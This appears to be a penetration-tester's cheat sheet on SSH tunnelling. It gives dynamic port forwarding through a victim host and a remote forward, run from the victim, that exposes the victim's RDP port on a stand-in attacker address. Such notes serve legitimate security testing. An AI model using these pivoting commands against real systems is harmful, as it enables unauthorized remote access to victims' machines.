#SSH Tunnelling

#SSH Dynamic Port Forwarding (opens a port on localhost 8088 that listens and connects anything using it as a proxy through the host at X.X.X.X)
#This is ATTACKER (open local port) -> SSH -> VICTIM
ssh -D 8088 root@X.X.X.X

#SSH Remote Port Forwarding:
#This is VICTIM (Forwards local port to port on attacker machine -> SSH -> ATTACKER IP:
ssh <gateway(attacker IP)> -R <remote port to bind>:<local host>:<local port>
#Example RDP Exposure (Attacker:X.X.X.X)
(From Victim - could use plink.exe as well)
ssh X.X.X.X -R 3390:127.0.0.1:3389
#The above will expose port 3390 on the attacker machine as the RDP port for the Victim)
